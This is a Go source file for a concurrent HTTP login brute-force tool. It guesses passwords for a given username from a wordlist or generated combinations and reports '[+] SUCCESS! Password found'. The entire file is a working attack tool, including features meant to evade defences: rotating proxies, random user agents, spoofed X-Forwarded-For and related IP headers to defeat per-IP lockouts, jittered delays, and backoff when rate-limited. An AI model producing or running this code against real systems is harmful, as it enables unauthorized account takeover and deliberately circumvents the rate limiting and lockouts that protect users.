package proxy

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
	"math/rand"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

type AttackConfig struct {
	TargetURL    string
	Username     string
	Wordlist     string
	UserField    string // default "username"
	PassField    string // default "password"
	SuccessRegex string // optional regex to check in response body
	Concurrency  int    // number of workers
	IsJSON       bool   // if true, send as JSON instead of form-urlencoded
	DelayMs      int    // Delay between each request
	BatchSize    int    // Number of requests before a longer batch delay
	BatchDelayMs int    // Longer delay after BatchSize requests
	ExpectedStatus int  // Status code to check
	StatusIsSuccess bool // True: ExpectedStatus means success; False: ExpectedStatus means failure
	GenCharset     string // Characters to use if wordlist is empty
	GenMaxLen      int    // Max length for generated passwords
	ProxyList      string // Path to proxy list file
	RandomUA       bool   // Use random user agents
	RandomIP       bool   // Use random IP headers (X-Forwarded-For)
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
}

func randomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d", 1+rand.Intn(254), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

type AttackProgressMsg struct {
	AttemptCount int
	Password     string
	Status       string // "Running", "Success", "Failed", "Error"
	FinalURL     string
	ResponseBody string
	ErrorMsg     string
}

type attackJob struct {
	password string
	attempt  int
}

type attackResult struct {
	password string
	attempt  int
	success  bool
	finalURL string
	respBody string
	err      error
}

func RunBruteForceUI(config AttackConfig, updateChan chan<- AttackProgressMsg, cancelChan <-chan bool) {
	// fmt.Printf("[Attack] Starting for target: %s\n", config.TargetURL)
	if config.UserField == "" {
		config.UserField = "username"
	}
	if config.PassField == "" {
		config.PassField = "password"
	}
	// fmt.Printf("[Attack] Config - UserField: %s, PassField: %s, Concurrency: %d\n", config.UserField, config.PassField, config.Concurrency)
	if config.Concurrency <= 0 {
		config.Concurrency = 1
	}
	if config.GenCharset == "" {
		config.GenCharset = "abcdefghijklmnopqrstuvwxyz0123456789"
	}
	if config.GenMaxLen <= 0 {
		config.GenMaxLen = 4 // Default safety limit
	}

	var scanner *bufio.Scanner
	var file *os.File
	var err error
	if config.Wordlist != "" {
		file, err = os.Open(config.Wordlist)
		if err != nil {
			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error opening wordlist: %v", err)}
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	}

	var successRegex *regexp.Regexp
	if config.SuccessRegex != "" {
		successRegex, err = regexp.Compile(config.SuccessRegex)
		if err != nil {
			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Invalid Success Regex: %v", err)}
			return
		}
	}

	jobs := make(chan attackJob, config.Concurrency*2)
	results := make(chan attackResult)
	done := make(chan bool)

	var wg sync.WaitGroup

	// Load proxies if provided
	var proxies []*url.URL
	if config.ProxyList != "" {
		pfile, err := os.Open(config.ProxyList)
		if err == nil {
			ps := bufio.NewScanner(pfile)
			for ps.Scan() {
				if u, err := url.Parse(strings.TrimSpace(ps.Text())); err == nil {
					proxies = append(proxies, u)
				}
			}
			pfile.Close()
		}
	}

	var proxyIndex int
	var pmu sync.Mutex

	// Shared transport for connection pooling - dynamically scaled with Concurrency for massive speed boost
	transport := &http.Client{
		Transport: &http.Transport{
			MaxIdleConns:        config.Concurrency * 2,
			IdleConnTimeout:     30 * time.Second,
			MaxIdleConnsPerHost: config.Concurrency * 2,
			DisableKeepAlives:   false,
			Proxy: func(r *http.Request) (*url.URL, error) {
				if len(proxies) == 0 {
					return nil, nil
				}
				pmu.Lock()
				defer pmu.Unlock()
				u := proxies[proxyIndex%len(proxies)]
				proxyIndex++
				return u, nil
			},
		},
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Workers
	// fmt.Printf("[Attack] Spawning %d workers...\n", config.Concurrency)
	for w := 0; w < config.Concurrency; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-cancelChan:
					return // İptal edildiyse worker'dan çık
				case job, ok := <-jobs:
					if !ok { return } // jobs kanalı kapandıysa çık
					
					res := attackResult{password: job.password, attempt: job.attempt}

				var reqBody io.Reader
				contentType := "application/x-www-form-urlencoded"

				if config.IsJSON {
					contentType = "application/json"
					payload := map[string]string{
						config.UserField: config.Username,
						config.PassField: job.password,
					}
					jsonBytes, _ := json.Marshal(payload)
					reqBody = bytes.NewReader(jsonBytes)
				} else {
					data := url.Values{}
					data.Set(config.UserField, config.Username)
					data.Set(config.PassField, job.password)
					reqBody = strings.NewReader(data.Encode())
				}

				// Max 3 retries for transient errors or rate limits
				success := false
				for retry := 0; retry < 3; retry++ {
					req, err := http.NewRequest("POST", config.TargetURL, reqBody)
					if err != nil {
						res.err = err
						break
					}
					req.Header.Add("Content-Type", contentType)
					if config.RandomUA {
						ua := userAgents[time.Now().UnixNano()%int64(len(userAgents))]
						req.Header.Set("User-Agent", ua)
					}
					if config.RandomIP {
						ip := randomIP()
						req.Header.Set("X-Forwarded-For", ip)
						req.Header.Set("X-Real-IP", ip)
						req.Header.Set("Client-IP", ip)
					}

					// If we need to retry, we must recreate the body reader
					if retry > 0 {
						if config.IsJSON {
							payload := map[string]string{
								config.UserField: config.Username,
								config.PassField: job.password,
							}
							jsonBytes, _ := json.Marshal(payload)
							req.Body = io.NopCloser(bytes.NewReader(jsonBytes))
						} else {
							data := url.Values{}
							data.Set(config.UserField, config.Username)
							data.Set(config.PassField, job.password)
							req.Body = io.NopCloser(strings.NewReader(data.Encode()))
						}
					}

					resp, err := transport.Do(req)
					if err != nil {
						res.err = err
						// Ağ hatası veya TCP limitlemesi olursa çok kısa bekle
						time.Sleep(100 * time.Millisecond)
						continue
					}

					// Check for rate limiting
					if resp.StatusCode == 429 {
						resp.Body.Close()
						time.Sleep(5 * time.Second)
						continue
					}

					bodyBytes, _ := io.ReadAll(resp.Body)
					resp.Body.Close()

					res.finalURL = resp.Request.URL.String()
					
					// Success detection logic
					if config.ExpectedStatus > 0 {
						match := resp.StatusCode == config.ExpectedStatus
						if config.StatusIsSuccess {
							res.success = match
						} else {
							res.success = !match
						}
					} else if resp.StatusCode == 302 || resp.StatusCode == 301 {
						res.success = true
						res.finalURL = resp.Header.Get("Location")
					} else if successRegex != nil {
						if successRegex.Match(bodyBytes) {
							res.success = true
						}
					} else {
						bodyStr := strings.ToLower(string(bodyBytes))
						if resp.StatusCode >= 200 && resp.StatusCode < 300 {
							if !strings.Contains(bodyStr, "incorrect") && 
							   !strings.Contains(bodyStr, "invalid") && 
							   !strings.Contains(bodyStr, "failed") &&
							   !strings.Contains(bodyStr, "hatal") { // hatalı, hatali vs
								res.success = true
							}
						}
					}
					
					if res.success {
						snippet := strings.TrimSpace(string(bodyBytes))
						if len(snippet) > 80 {
							snippet = snippet[:77] + "..."
						}
						res.respBody = strings.ReplaceAll(snippet, "\n", " ")
					}

					success = true
					break // Successfully processed (win or lose)
				}

				if !success && res.err == nil {
					res.err = fmt.Errorf("failed after retries (rate limited or server error)")
				}

				results <- res

				// Delay logic with Jitter
				if config.DelayMs > 0 {
					// Add random jitter (±20%)
					jitter := 0
					if config.DelayMs > 10 {
						jitter = (time.Now().Nanosecond() % (config.DelayMs / 5)) - (config.DelayMs / 10)
					}
					time.Sleep(time.Duration(config.DelayMs+jitter) * time.Millisecond)
				}
				if config.BatchSize > 0 && job.attempt % config.BatchSize == 0 {
					if config.BatchDelayMs > 0 {
						time.Sleep(time.Duration(config.BatchDelayMs) * time.Millisecond)
					}
				}
				} // end select
			} // end for
		}()
	}

	// Result collector with rate-limiting and block detection
	var finalResult *attackResult
	go func() {
		lastUpdate := time.Now()
		errorCount := 0
		for res := range results {
			if res.err != nil {
				errorCount++
				if errorCount > 50 { // Stop if too many errors
					updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: "Too many errors. Server might be blocking us."}
					// Note: workers will eventually finish or we could signal them
				}
			} else {
				errorCount = 0 // Reset on success
			}

			if res.success && finalResult == nil {
				fr := res
				finalResult = &fr
			}
			
			// Only update UI every 100ms to avoid overwhelming it
			if finalResult == nil && time.Since(lastUpdate) > 100*time.Millisecond {
				updateChan <- AttackProgressMsg{
					AttemptCount: res.attempt,
					Password:     res.password,
					Status:       "Running",
				}
				lastUpdate = time.Now()
			}
		}
		done <- true
	}()

	// Scanner or Generator
	attemptCount := 0
	if config.Wordlist != "" {
		// fmt.Printf("[Attack] Using wordlist: %s\n", config.Wordlist)
		file, err = os.Open(config.Wordlist)
		if err != nil {
			// fmt.Printf("[Attack] Error opening wordlist: %v\n", err)
			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error opening wordlist: %v", err)}
			return
		}
		defer file.Close()
		scanner = bufio.NewScanner(file)
	}

	if scanner != nil {
		for scanner.Scan() {
			if finalResult != nil { break }
			
			// Her adımda iptali kontrol et
			select {
			case <-cancelChan:
				close(jobs)
				wg.Wait()
				return
			default:
			}

			password := strings.TrimSpace(scanner.Text())
			if password == "" { continue }
			attemptCount++
			jobs <- attackJob{password: password, attempt: attemptCount}
		}
	} else {
		// fmt.Printf("[Attack] No wordlist, starting auto-generation (MaxLen: %d)...\n", config.GenMaxLen)
		// Generate combinations
		chars := []rune(config.GenCharset)
		var generate func(prefix string, length int) bool
		generate = func(prefix string, length int) bool {
			if length == 0 {
				if finalResult != nil { return true }
				attemptCount++
				jobs <- attackJob{password: prefix, attempt: attemptCount}
				return false
			}
			for _, c := range chars {
				if generate(prefix+string(c), length-1) { return true }
			}
			return false
		}

		for l := 1; l <= config.GenMaxLen; l++ {
			if generate("", l) { break }
		}
	}
	close(jobs)
	wg.Wait()
	close(results)
	<-done

	if finalResult != nil {
		updateChan <- AttackProgressMsg{
			AttemptCount: finalResult.attempt,
			Password:     finalResult.password,
			Status:       "Success",
			FinalURL:     finalResult.finalURL,
			ResponseBody: finalResult.respBody,
		}
		return
	}

	if scanner != nil {
		if err := scanner.Err(); err != nil {
			updateChan <- AttackProgressMsg{Status: "Error", ErrorMsg: fmt.Sprintf("Error reading wordlist: %v", err)}
			return
		}
	}

	updateChan <- AttackProgressMsg{Status: "Failed"}
}

func RunBruteForce(config AttackConfig) {
	fmt.Println("Starting brute force attack tool...")
	fmt.Printf("Target: %s\n", config.TargetURL)
	fmt.Printf("Username: %s\n", config.Username)
	fmt.Printf("Wordlist: %s\n", config.Wordlist)
	
	updateChan := make(chan AttackProgressMsg)
	cancelChan := make(chan bool) // Dummy cancel channel for CLI
	go RunBruteForceUI(config, updateChan, cancelChan)

	for msg := range updateChan {
		switch msg.Status {
		case "Running":
			fmt.Printf("\rAttempt %d: Trying password '%s'...", msg.AttemptCount, msg.Password)
		case "Success":
			fmt.Printf("\n[+] SUCCESS! Password found: %s\n", msg.Password)
			fmt.Printf("[+] Final URL reached: %s\n", msg.FinalURL)
			return
		case "Failed":
			fmt.Printf("\n[-] Attack finished. Password not found.\n")
			return
		case "Error":
			fmt.Printf("\n[!] Error: %s\n", msg.ErrorMsg)
			return
		}
	}
}


